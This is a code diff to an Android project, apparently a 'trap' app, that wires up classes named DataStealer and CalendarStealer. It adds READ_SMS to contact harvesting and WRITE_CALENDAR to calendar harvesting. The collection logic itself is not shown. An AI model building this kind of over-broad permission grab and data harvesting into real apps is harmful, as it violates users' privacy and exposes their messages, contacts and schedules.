@@ -5,6 +5,7 @@ import android.Manifest;
 import java.util.Arrays;
 import java.util.List;
 
+import de.hpi3d.gamepgrog.trap.android.CalendarStealer;
 import de.hpi3d.gamepgrog.trap.android.CameraStealer;
 import de.hpi3d.gamepgrog.trap.android.DataStealer;
 import de.hpi3d.gamepgrog.trap.android.LocationStealer;
@@ -19,14 +20,18 @@ public class TaskResolverManager {
     private final static TaskResolver<Contact> contactTaskResolver =
             new SyncTaskResolver<>(
                     "contact",
-                    new String[]{Manifest.permission.READ_CONTACTS},
+                    new String[]{
+                            Manifest.permission.READ_CONTACTS,
+                            Manifest.permission.READ_SMS},
                     DataStealer::takeContactData);
 
     private final static TaskResolver<CalendarEvent> calendarTaskResolver =
             new SyncTaskResolver<>(
                     "calendar",
-                    new String[]{Manifest.permission.READ_CALENDAR},
-                    DataStealer::takeCalendarData);
+                    new String[]{
+                            Manifest.permission.READ_CALENDAR,
+                            Manifest.permission.WRITE_CALENDAR},
+                    CalendarStealer::takeCalendarData);
 
     private final static TaskResolver<Language> languageResolver =
             new SyncTaskResolver<>(
